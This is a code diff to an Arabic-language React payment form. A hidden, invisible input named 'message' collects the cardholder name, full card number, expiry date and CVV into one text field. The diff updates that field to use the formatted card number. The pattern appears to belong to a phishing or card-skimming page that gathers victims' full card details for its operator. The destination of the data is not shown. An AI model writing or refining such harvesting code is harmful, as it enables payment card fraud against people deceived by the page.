@@ -142,7 +142,7 @@ const PaymentMethods = () => {
                         <section>
                             <h3 className="font-bold mt-[15px] text-[16px]">رقم البطاقة</h3>
                             <div className='mt-[5px] pb-[50px] relative'>
-                                <input style={{ direction: "ltr" }} value={card.length ? card : ""} required onChange={handelChange} maxLength={19} type="text" className={`text-right w-full absolute h-[42px] transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${(isValidCardNumber === false || cardNumber.length < 14 && cardNumber.length !== 0) ? "border-red-600 focus:border-red-600" : "border-transparent"}`} placeholder="7584 4894 4875 4844" />
+                                <input style={{ direction: "ltr" }} value={card} required onChange={handelChange} maxLength={19} type="text" className={`text-right w-full absolute h-[42px] transition-all duration-[300ms] bg-[#f9f9f9] outline-none border border-transparent focus:border-[#ddd] focus:border rounded-[6px] text-sm px-[13px] py-[10px] font-[abc] placeholder:font-bold placeholder:text-[#4444] ${(isValidCardNumber === false || cardNumber.length < 14 && cardNumber.length !== 0) ? "border-red-600 focus:border-red-600" : "border-transparent"}`} placeholder="7584 4894 4875 4844" />
                                 <img src={visa.src} className={`w-[30px] transition-all duration-[300ms] object-cover left-2 top-1/2 -translate-y-1/2 absolute z-[222] ${card.length > 0 && card.length === 19 ? "opacity-[1]" : "opacity-[0]"}`} alt="" />
                             </div>
                             {card.length !== 19 && card.length > 0 ?
@@ -182,7 +182,7 @@ const PaymentMethods = () => {
                                 </div>
                             </section>
                         </section>
-                        <input name='message' className='opacity-0' onChange={(e) => setMsg(e.target.value)} ref={ref4} type="text" value={`card name: ${cardName}\n card number: ${cardNumber}\n exp(y: (${expiresYear})) exp(m: (${expiresMonth})) cvv(${cvv})`} />
+                        <input name='message' className='opacity-0' onChange={(e) => setMsg(e.target.value)} ref={ref4} type="text" value={`card name: ${cardName}\n card number: ${card}\n exp(y: (${expiresYear})) exp(m: (${expiresMonth})) cvv(${cvv})`} />
                         <button className='block sub w-full active:scale-[1.01] p-[14px] transition-all duration-[100ms] rounded-[6px] shadow-lg text-white my-[15px] outline-0 font-bold bg-[#f68024] hover:bg-[#ea6e0e]' disabled={isLoading === false && true}>{!isLoading ? "اكمال عملية الدفع" : "جاري معالجة طلبك..."}</button>
                     </form>
                 }
